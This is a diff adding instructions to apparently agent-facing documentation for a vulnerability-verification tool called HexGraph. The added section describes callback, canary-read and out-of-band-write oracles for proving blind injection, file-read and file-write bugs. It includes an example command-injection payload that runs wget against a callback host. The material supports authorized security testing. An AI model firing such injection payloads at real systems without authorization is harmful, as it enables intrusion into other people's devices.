@@ -149,6 +149,28 @@ shows what's listening. To assess these LIVE:
   can't forge it. Requires **features.network**; bounded to the device host:port, audited.
 - Record the service as a `socket` node, the verified PoC as a `poc` finding `confirms`→ the vuln.
 
+## 2e. Proving BLIND bugs and read/write primitives (oracles beyond reflected output)
+Reflected `body_contains`/`response_contains` only proves a bug that echoes output back. For
+the rest, `verify_poc` has three unforgeable oracles that observe a side effect on a channel
+INDEPENDENT of your request (so a match can't be reflected/faked) — call
+`get_schemas['verify_poc_oracles']` for the exact spec shape:
+- **Blind command-injection / SSRF / blind RCE** (no reflected output) → **`callback`**: put a
+  `{{CALLBACK}}` token (host:port + a per-run nonce path) in the injected command or SSRF URL
+  (e.g. `; wget http://{{CALLBACK}}`), with `oracle:{type:"callback"}`. HexGraph stands up a
+  bounded LOCAL listener and verifies it received a hit carrying the nonce — proof the injected
+  code ran even with zero output. (Bounded local-only listener, features.network-gated, audited.)
+- **Arbitrary file read / path traversal / info disclosure** → **`canary_read`**: HexGraph
+  PLANTS a random canary out-of-band BEFORE your exploit (`plant:{channel:"rootfs",path}`), or
+  uses a `known_value` it read independently; your read primitive must return it
+  (`oracle:{type:"canary_read"}`, reference the planted value with `{{CANARY}}`). Unforgeable —
+  a freshly-planted random value can't be guessed.
+- **Arbitrary file/config/NVRAM write / persistence** → **`oob_write`**: write `{{NONCE}}` with
+  your exploit, then `oracle:{type:"oob_write", channel:"rootfs"|"remote"|"http", path?|request?}`
+  — HexGraph reads that location back out-of-band and checks the nonce landed.
+These are DYNAMIC: fired through a live web/tcp/remote surface ⇒ `input_reachable`; an isolated
+binary/harness ⇒ `code_present` (lab-confirmed). Record the verified PoC as a `poc` finding
+`confirms`→ the vuln, same rhythm as the cmdi flow above.
+
 ## 3. Record AS YOU GO — write to the graph BEFORE you've confirmed things
 Capture the moment you have a lead, not after you've proven it. The graph is a
 live worklog: a suspicion recorded early is visible to the analyst and other
